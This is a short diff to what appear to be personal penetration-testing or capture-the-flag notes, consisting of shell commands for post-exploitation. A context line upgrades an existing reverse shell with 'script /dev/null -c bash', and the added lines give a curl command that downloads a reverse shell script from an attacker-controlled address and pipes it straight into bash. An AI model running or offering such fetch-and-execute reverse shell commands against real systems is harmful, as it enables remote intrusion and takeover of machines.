@@ -29,3 +29,7 @@ then write
 Ugrading the the reverse shell we got
 
 	script /dev/null -c bash
+
+Download reverse shell file and imediately execute it
+
+	curl 'http://10.10.16.20:2020/test.sh'|bash
